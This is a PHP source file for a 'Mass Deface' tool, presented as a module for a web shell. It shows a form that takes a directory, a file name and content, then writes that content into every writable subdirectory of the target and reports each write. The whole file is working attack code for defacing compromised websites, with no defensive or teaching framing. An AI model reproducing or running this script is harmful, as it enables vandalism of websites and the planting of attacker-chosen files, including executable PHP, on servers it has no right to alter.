<?php
/**********************************************
Name: <Sana-Sini> Mass Deface                 *
Author: ./MyHeartIsyr                         *
Blog: https://myheart-isyr.blogspot.com       *
Description: Just an external module for      *
<Sana-Sini> Shell                             *
***********************************************/
function hahawekz($x, $y, $z){
	if(is_writable($x)){
		$open = opendir($x);
		while($cox = readdir($open)){
			$xy = "$x/$cox";
			$loc = $xy."/".$y;
			if($loc === "."){
				file_put_contents($loc, $z);
			}
			elseif($loc === ".."){
				file_put_contents($loc, $z);
			}
			else {
				if(is_dir($xy)){
					if(is_writable($xy)){
						echo "Done. -> $loc<br>";
						file_put_contents($loc, $z);
					}
				}
			}
		}
	}
	else {
		echo "Failed to mass deface";
	}
}
$cwd = str_replace("\\", "/", @getcwd());

echo "<style>
body {
	background: #000;
	color: #fff;
}
input[type=text]{
	border: 1px solid #fff;
	background: transparent;
	color: #fff;
}
textarea {
	resize: none;
	background: black;
	color: white;
	border: 1px solid #fff;
}
input[type=submit]{
	background: transparent;
	color: #fff;
	border: 1px solid #fff;
}
h1, h3 {
	font-family: Courier New;
}
</style>
<center><h1>&lt;Sana-Sini&gt; Mass Deface</h1>
<h3>by: ./MyHeartIsyr</h3>
<form method='post'>
<input style='width: 350px;' type='text' name='dir' value='".$cwd."'><br>
<input style='width: 350px;' type='text' name='file' value='justhello.php'><br>
<textarea name='script' style='width: 50%; height: 400px;'>
./MyHeartIsyr Is In Da Houze Yo
</textarea><br>
<input type='submit' name='go' value='>>'>
</form></center>";

if(isset($_POST['go'])){
	hahawekz($_POST['dir'], $_POST['file'], $_POST['script']);
}